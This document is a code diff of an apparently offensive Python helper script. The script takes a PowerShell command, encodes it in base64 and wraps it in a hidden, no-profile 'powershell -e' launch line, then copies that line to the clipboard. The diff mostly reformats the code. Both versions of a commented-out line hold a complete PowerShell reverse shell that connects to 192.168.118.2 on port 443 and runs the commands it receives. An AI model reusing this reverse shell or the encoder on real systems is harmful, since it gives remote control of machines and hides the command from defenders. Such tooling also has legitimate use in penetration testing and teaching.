@@ -20,13 +20,16 @@ if len(sys.argv) == 2:
         payload = f.read()
     print(f"[*] Payload read from file: {myfile}")
 else:
-    #payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+    # payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
     print("[!] No file given as argument.")
     payload = input("[+] Please provide powershell command: ")
 
 print(f"\n[*] Original payload: {payload}\n")
 
-cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+cmd = (
+    "powershell -nop -w hidden -e "
+    + base64.b64encode(payload.encode("utf16")[2:]).decode()
+)
 
 now = datetime.strftime(datetime.now(), "%m%d_%H%M%S")
 command_file = f"ps_encoded_cmd_{now}.txt"
@@ -34,7 +37,9 @@ with open(command_file, "w") as cf:
     cf.write(cmd)
     cf.flush()
 
-os.system(f'echo {cmd} | xclip -sel clip')
+os.system(f"echo -n {cmd} | xclip -sel clip")
 
-print(f"[!] Encoded ps command copied to clipboard, and saved to file: {command_file}\n")
+print(
+    f"[!] Encoded ps command copied to clipboard, and saved to file: {command_file}\n"
+)
 print(cmd)
